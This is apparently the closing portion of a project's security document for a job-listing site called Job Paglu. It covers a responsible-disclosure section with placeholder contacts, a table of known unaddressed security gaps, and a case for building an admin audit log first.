- [ ] A Neon backup or branch exists before any destructive migration

---

## Responsible disclosure

If you believe you have found a security issue in Job Paglu, please report it
privately rather than opening a public issue, and allow time for a fix before
any disclosure.

> **PLACEHOLDER — MUST BE FILLED IN BEFORE LAUNCH.**
>
> - Contact address: `TODO — a monitored security contact, e.g. security@<your-domain>`
> - PGP key: `TODO — publish a fingerprint here, or state explicitly that encrypted mail is not supported`
> - Target acknowledgement time: `TODO`
> - Target fix time for a critical issue: `TODO`
>
> No email address or key is invented here on purpose. A published security
> contact that nobody reads is worse than none at all: it converts a reporter
> who would have found another way to reach you into a reporter who tried,
> was ignored, and published. Fill this in with an address that a human
> monitors, then delete this block.

Once the contact exists, consider also publishing `/.well-known/security.txt`
with the same details, so an automated scanner can find it.

Out of scope for a report, in advance: missing security headers on a preview
deployment, findings that require an already-compromised admin account, and
reports generated by a scanner with no demonstrated impact.

---

## Not yet done

Read this section as the roadmap it is. Everything above is designed and written;
everything here is absent.

| Gap | Status | Impact |
|---|---|---|
| **No admin action audit log** | Not built | **The most valuable next addition — see below** |
| **The site does not own its registrable domain** | By necessity, for now | `home.jobpaglu.eu.cc` shares `eu.cc` with strangers, so `SameSite=Lax` is inert and certificate rate limits are shared. Mitigated by the `__Host-` prefix, the duplicate-cookie guard and the single-origin topology; fully fixed only by owning a domain. See [the `eu.cc` section](#the-eucc-shared-suffix-problem) |
| Dependency and secret scanning have never run | Configured in `.github/workflows/ci.yml` — `gosec`, `govulncheck`, `npm audit`, secret scanning — but no workflow has executed, because nothing in this repository has been built or run | An advisory affecting a dependency would currently go unnoticed. The first CI run is the fix and costs nothing |
| No penetration test | Not done | The controls above are designed and reviewed by reading, not adversarially tested. Reviewing your own auth code is not the same as someone trying to break it |
| No WAF or bot rules | Not configured | Vercel's firewall / rate-limiting features sit in front of both projects and could enforce a request rate at the edge, but no rules are defined. This matters more than it did: the in-process login limiter's multiplier is now unbounded, so an edge rule is the only limit that would be genuinely system-wide without a code change |
| No 2FA on the admin account | Not built | A single password is the only thing between an attacker and full content control. TOTP is a small, well-understood addition and would meaningfully raise the bar |
| No account lockout, only rate limiting | By design, for now | Rate limiting slows an attacker; it never stops one who is patient. Lockout introduces a denial-of-service against a legitimate admin, which for a single-admin system is a real cost — hence the deferral |
| No automated security tests in CI beyond scanning | Not built | The contract's security-relevant behaviours (draft invisibility, admin routes returning `401`, CSRF rejection, apply-URL rejection) are in the test plan as T-3, T-5, T-6 and T-7 but have never been executed |
| No log-based alerting | Not configured | A burst of `401`s or `429`s is visible in the Vercel project's runtime logs and nothing watches for it. Note that serverless log retention on a free plan is short, so checking the logs after the fact is a narrower option than it was |
| No backup schedule or tested restore | Not configured | Neon provides branching and point-in-time features on its plans; no policy is set here, and an untested restore is a hope rather than a backup |
| No `security.txt` | Not published | Depends on the disclosure contact above |
| Rate-limit counters not shared across instances | By design, for now, and **weaker on serverless** | See [section 6](#6-login-hardening). Sessions themselves *are* in Postgres and therefore shared and revocable; only the rate-limit counters are per-instance. On the current host the instance count is unbounded, so this is the highest-value item on this list after the audit log |
| Expired sessions are not reliably collected | Housekeeping only | The background sweeper in `cmd/server/main.go` ticks hourly, and on serverless an instance frequently never lives long enough to reach the first tick. Not a security gap: every expiry is enforced on read in `LookupSession`, so an uncollected row is not a usable credential. It is a storage question, and the fix is a scheduled job rather than a longer ticker in a process that may not exist |

### Why the audit log is the most valuable next addition

Every other gap makes an attack somewhat easier. The missing audit log makes an
attack **invisible and un-investigable**, which is a different class of problem.

Today, if an admin session were stolen, the attacker could edit any job's
`apply_url` to point at a credential-harvesting page, publish it, and then set it
back an hour later. Afterwards:

- The `jobs` row shows a recent `updated_at` and nothing else. There is no
  previous value, no actor, no time-ordered record of what changed.
- The request log shows that `PUT /api/admin/jobs/{id}` returned `200`. It does
  not show what was sent, because bodies are deliberately not logged.
- You cannot answer the only questions that matter during an incident: *what was
  changed, by whom, when, and what was the value before?*

An append-only table — actor, action, target id, before, after, timestamp,
request ID, IP — written in the service layer where each mutation already has
all of that in hand, turns an unanswerable incident into a query. It is perhaps
a day of work, it needs no new dependency, and it is the only item on this list
whose absence cannot be compensated for after the fact.
